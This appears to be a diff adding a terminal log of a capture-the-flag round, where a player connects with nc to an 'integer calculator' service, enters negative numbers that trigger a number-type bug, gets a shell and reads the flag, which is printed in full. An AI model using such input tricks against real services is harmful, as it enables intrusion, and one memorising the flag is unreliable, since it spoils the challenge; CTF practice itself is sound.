@@ -1,0 +1,12 @@
+(pwn_env) hanabi@polito:~/svt_ctf/round_2/interger-calculator$ nc svtctf.m0lecon.it 13499
+Welcome to simple calculator!
+For now, we only support addition.
+
+Please, enter the first number: -1
+Now, enter the second number: -3
+Something went REALLY wrong!
+ls
+chall
+flag
+cat flag
+svt{b3_c4r3ful_w1th_numb3rs_typ3s_fLM2MfZXOidaHABl}
